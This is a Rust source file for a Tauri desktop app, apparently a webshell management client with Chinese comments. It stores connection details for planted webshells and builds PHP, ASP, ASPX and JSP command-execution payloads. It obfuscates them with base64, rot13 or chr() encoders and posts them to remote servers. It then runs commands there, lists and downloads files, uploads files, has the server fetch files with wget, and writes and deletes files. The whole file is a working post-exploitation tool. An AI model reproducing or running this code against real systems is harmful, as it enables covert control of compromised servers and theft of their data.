// Prevents additional console window on Windows in release, DO NOT REMOVE!!
#![cfg_attr(not(debug_assertions), windows_subsystem = "windows")]


use serde::{Serialize, Deserialize};
use tauri::State;
use std::fs;
use std::path::PathBuf;
use std::sync::Mutex;
use tauri::api::path;
use std::path::Path;

#[derive(Serialize, Deserialize, Clone)]
struct ConnectionInfo {
    id: String,
    url: String,
    password: String,
    language: String,
    encoding: String,
    encoder: String,
    decoder: String,
}

#[tauri::command]
fn open_input_window(app_handle: tauri::AppHandle) -> Result<String, String> {
    let window = tauri::WindowBuilder::new(
        &app_handle,
        "input", // unique identifier
        tauri::WindowUrl::App("input.html".into())
    )
    .title("新建shell")
    .inner_size(325.0, 325.0)
    .build()
    .map_err(|e| e.to_string())?;

    Ok(window.label().to_string())
}

struct AppState {
    connections: Mutex<Vec<ConnectionInfo>>,
    storage_path: PathBuf,
}

fn load_connections(path: &PathBuf) -> Vec<ConnectionInfo> {
    match fs::read_to_string(path) {
        Ok(contents) => serde_json::from_str(&contents).unwrap_or_default(),
        Err(_) => Vec::new(),
    }
}

fn save_connections(connections: &Vec<ConnectionInfo>, path: &PathBuf) -> Result<(), Box<dyn std::error::Error>> {
    let json = serde_json::to_string(connections)?;
    fs::write(path, json)?;
    Ok(())
}

#[tauri::command]
fn save_connection_info(state: State<AppState>, info: ConnectionInfo) -> Result<(), String> {
    let mut connections = state.connections.lock().unwrap();
    connections.push(info);
    save_connections(&connections, &state.storage_path).map_err(|e| e.to_string())?;
    Ok(())
}

#[tauri::command]
fn get_connection_info(state: State<AppState>) -> Vec<ConnectionInfo> {
    state.connections.lock().unwrap().clone()
}

#[tauri::command]
fn delete_connection(state: State<AppState>, id: String) -> Result<(), String> {
    let mut connections = state.connections.lock().unwrap();
    connections.retain(|conn| conn.id != id);
    save_connections(&connections, &state.storage_path).map_err(|e| e.to_string())?;
    Ok(())
}

use reqwest;
use base64;
use encoding_rs::Encoding;

fn encode(input: &str, encoder: &str) -> String {
    match encoder {
        "base64" => base64::encode(input),
        "rot13" => input.chars().map(|c| {
            if c.is_ascii_alphabetic() {
                let base = if c.is_ascii_lowercase() { b'a' } else { b'A' };
                ((c as u8 - base + 13) % 26 + base) as char
            } else {
                c
            }
        }).collect(),
        "chr" => input.bytes().map(|b| format!("chr({})", b)).collect::<Vec<String>>().join("."),
        "char16" => input.encode_utf16().map(|u| format!("\\u{:04X}", u)).collect(),
        _ => input.to_string(), // default
    }
}

fn decode(input: &str, decoder: &str) -> Result<String, String> {
    match decoder {
        "base64" => String::from_utf8(base64::decode(input).map_err(|e| e.to_string())?)
            .map_err(|e| e.to_string()),
        "rot13" => Ok(input.chars().map(|c| {
            if c.is_ascii_alphabetic() {
                let base = if c.is_ascii_lowercase() { b'a' } else { b'A' };
                ((c as u8 - base + 13) % 26 + base) as char
            } else {
                c
            }
        }).collect()),
        _ => Ok(input.to_string()), // default
    }
}

#[tauri::command]
async fn execute_remote_shell(connection_info: ConnectionInfo, command: String, working_directory: String) -> Result<String, String> {
    let client = reqwest::Client::new();
    
    // 构造完整的命令，包括切换目录
    let full_command = format!("cd \"{}\" && {}", working_directory, command);
    
    // 根据选择的语言生成适当的代码
    let code = match connection_info.language.as_str() {
        "php" => format!(
            "echo shell_exec(base64_decode('{}'));",
            base64::encode(&full_command)
        ),
        "asp" => format!(
            "Response.Write(Server.URLEncode(ExecuteGlobal(Request.Form(\"{}\"))))",
            full_command
        ),
        "aspx" => format!(
            "Response.Write(Convert.ToBase64String(Encoding.UTF8.GetBytes(ExecuteCommand(Convert.FromBase64String(Request.Form[\"{}\"])))))",
            connection_info.password
        ),
        "jsp" => format!(
            "<%@ page import=\"java.io.*\"%><%Process p=Runtime.getRuntime().exec(new String[]{{\"sh\",\"-c\",\"{}\"}});BufferedReader b=new BufferedReader(new InputStreamReader(p.getInputStream()));String s=null;while((s=b.readLine())!=null){{out.println(s);}}%>",
            full_command
        ),
        _ => return Err("Unsupported language".to_string()),
    };

    // 应用编码器
    let encoded_code = encode(&code, &connection_info.encoder);

    // 构造请求参数
    let params = vec![(connection_info.password, encoded_code)];

    // 发送请求
    let response = client.post(&connection_info.url)
        .form(&params)
        .send()
        .await
        .map_err(|e| e.to_string())?;

    if response.status().is_success() {
        let body = response.text().await.map_err(|e| e.to_string())?;
        
        // 应用解码器
        let decoded_body = decode(&body, &connection_info.decoder)?;

        // 应用字符编码
        let bytes = decoded_body.into_bytes();
        let (cow, _, _) = Encoding::for_label(connection_info.encoding.as_bytes())
            .unwrap_or(encoding_rs::UTF_8)
            .decode(&bytes);
        
        Ok(cow.into_owned())
    } else {
        Err(format!("Request failed with status: {}", response.status()))
    }
}



//文件内容
#[derive(Serialize, Deserialize, Clone)]
struct FileInfo {
    name: String,
    is_dir: bool,
    children: Option<Vec<FileInfo>>,
}


async fn execute_command(connection_info: &ConnectionInfo, command: &str) -> Result<String, String> {
    let client = reqwest::Client::new();
    
    // 根据选择的语言生成适当的代码
    let code = match connection_info.language.as_str() {
        "php" => format!(
            "echo shell_exec(base64_decode('{}'));",
            base64::encode(command)
        ),
        "asp" => format!(
            "Response.Write(Server.URLEncode(ExecuteGlobal(Request.Form(\"{}\"))))",
            command
        ),
        "aspx" => format!(
            "Response.Write(Convert.ToBase64String(Encoding.UTF8.GetBytes(ExecuteCommand(Convert.FromBase64String(Request.Form[\"{}\"])))))",
            connection_info.password
        ),
        "jsp" => format!(
            "<%@ page import=\"java.io.*\"%><%Process p=Runtime.getRuntime().exec(new String[]{{\"sh\",\"-c\",\"{}\"}});BufferedReader b=new BufferedReader(new InputStreamReader(p.getInputStream()));String s=null;while((s=b.readLine())!=null){{out.println(s);}}%>",
            command
        ),
        // 添加其他语言的支持...
        _ => return Err("Unsupported language".to_string()),
    };

    // 应用编码器
    let encoded_code = encode(&code, &connection_info.encoder);

    // 构造请求参数
    let params = vec![(connection_info.password.clone(), encoded_code)];

    // 发送请求
    let response = client.post(&connection_info.url)
        .form(&params)
        .send()
        .await
        .map_err(|e| e.to_string())?;

    if response.status().is_success() {
        let body = response.text().await.map_err(|e| e.to_string())?;
        
        // 应用解码器
        let decoded_body = decode(&body, &connection_info.decoder)?;

        // 应用字符编码
        let bytes = decoded_body.into_bytes();
        let (cow, _, _) = Encoding::for_label(connection_info.encoding.as_bytes())
            .unwrap_or(encoding_rs::UTF_8)
            .decode(&bytes);
        
        Ok(cow.into_owned())
    } else {
        Err(format!("Request failed with status: {}", response.status()))
    }
}


#[tauri::command]
async fn get_remote_files(connection_info: ConnectionInfo, path: String) -> Result<Vec<FileInfo>, String> {
    let command = format!("ls -la {}", path);
    let output = execute_command(&connection_info, &command).await?;
    
    let files: Vec<FileInfo> = output
        .lines()
        .filter(|line| !line.starts_with("total"))
        .map(|line| {
            let parts: Vec<&str> = line.split_whitespace().collect();
            let name = parts.last().unwrap_or(&"").to_string();
            FileInfo {
                name: name.clone(),
                is_dir: line.starts_with('d'),
                children: None,
            }
        })
        .collect();

    Ok(files)
}

#[tauri::command]
async fn download_file(app_handle: tauri::AppHandle, connection_info: ConnectionInfo, path: String) -> Result<String, String> {
    let command = format!("cat {}", path);
    let output = execute_command(&connection_info, &command).await?;
    
    // 生成一个唯一的文件名
    let file_name = Path::new(&path).file_name().unwrap_or_default().to_str().unwrap_or("download");
    let temp_path = app_handle.path_resolver().app_local_data_dir().unwrap().join(format!("{}-{}", chrono::Utc::now().timestamp(), file_name));
    
    std::fs::write(&temp_path, output).map_err(|e| e.to_string())?;
    
    Ok(temp_path.to_str().unwrap().to_string())
}

#[tauri::command]
async fn upload_file(connection_info: ConnectionInfo, path: String, content: Vec<u8>) -> Result<(), String> {
    println!("Attempting to upload file to: {}", path);

    // 确保目标目录存在
    let target_path = Path::new(&path);
    if let Some(parent) = target_path.parent() {
        let mkdir_command = format!("mkdir -p '{}'", parent.to_string_lossy());
        execute_command(&connection_info, &mkdir_command).await?;
    }

    let base64_content = base64::encode(&content);
    let command = format!("echo '{}' | base64 -d > '{}'", base64_content, path);
    
    match execute_command(&connection_info, &command).await {
        Ok(_) => {
            println!("File upload successful to: {}", path);
            Ok(())
        },
        Err(e) => {
            println!("File upload failed: {}", e);
            Err(e)
        }
    }
}

#[tauri::command]
fn move_file(src: String, dst: String) -> Result<(), String> {
    fs::rename(src, dst).map_err(|e| e.to_string())
}

#[tauri::command]
async fn change_directory(connection_info: ConnectionInfo, new_path: String, current_path: String) -> Result<serde_json::Value, String> {
    let full_path = if new_path.starts_with('/') {
        new_path
    } else {
        format!("{}/{}", current_path.trim_end_matches('/'), new_path)
    };

    // 检查目录是否存在
    let check_command = format!("[ -d \"{}\" ] && echo \"exists\" || echo \"not exists\"", full_path);
    let output = execute_command(&connection_info, &check_command).await?;

    if output.trim() == "exists" {
        Ok(serde_json::json!({
            "success": true,
            "newPath": full_path
        }))
    } else {
        Ok(serde_json::json!({
            "success": false,
            "error": "Directory does not exist"
        }))
    }
}


#[tauri::command]
async fn wget_download(connection_info: ConnectionInfo, remote_file_path: String, local_file_path: String) -> Result<(), String> {
    let wget_command = format!("wget -O '{}' '{}'", local_file_path, remote_file_path);
    
    execute_remote_shell(connection_info, wget_command, ".".to_string()).await
        .map(|_| ())
        .map_err(|e| e.to_string())
}


#[tauri::command]
async fn create_remote_file(connection_info: ConnectionInfo, file_path: String, content: String) -> Result<(), String> {
    let command = format!("echo \"{}\" > {}", content.replace("\"", "\'"), file_path);
    execute_remote_shell(connection_info, command, ".".to_string()).await
        .map(|_| ())
        .map_err(|e| e.to_string())
}

#[tauri::command]
async fn delete_remote_file(connection_info: ConnectionInfo, file_path: String) -> Result<(), String> {
    let command = format!("rm {}", file_path);
    execute_remote_shell(connection_info, command, ".".to_string()).await
        .map(|_| ())
        .map_err(|e| e.to_string())
}


fn main() -> Result<(), Box<dyn std::error::Error>> {
    let context = tauri::generate_context!();
    let app_data_dir = path::app_data_dir(&context.config()).ok_or("Failed to get app data dir")?;
    let storage_path = app_data_dir.join("connections.json");
    let connections = load_connections(&storage_path);

    tauri::Builder::default()
        .manage(AppState {
            connections: Mutex::new(connections),
            storage_path,
        })
        .invoke_handler(tauri::generate_handler![
            save_connection_info,
            get_connection_info,
            delete_connection,
            open_input_window,
            get_remote_files,
            execute_remote_shell,
            download_file,
            upload_file,
            move_file,
            change_directory,
            wget_download,
            create_remote_file,
            delete_remote_file,
        ])
        .run(context)
        .expect("error while running tauri application");

    Ok(())
}